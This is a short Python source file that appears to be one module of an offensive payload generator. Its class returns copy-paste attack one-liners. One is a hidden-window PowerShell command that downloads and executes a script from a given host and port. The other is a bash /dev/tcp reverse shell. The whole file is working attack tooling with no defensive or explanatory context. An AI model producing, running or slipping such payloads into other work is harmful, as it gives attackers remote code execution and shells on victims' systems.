# one-liner payload generator
# quick copy-paste reverse shells for terminal use

from generators.base import BaseGenerator


class OneLinerGenerator(BaseGenerator):
    LANG_ID = "line"
    LANG_NAME = "One-Liner"
    FILE_EXT = ".txt"

    def generate(self, host, port, opts, ptype, tpl, adv):
        if ptype in ("ps_dl_exec", "cmd_one_liner"):
            return f"powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{host}:{port}/p')\""
        elif ptype == "reverse_tcp":
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        return "# no one-liner available for this type"
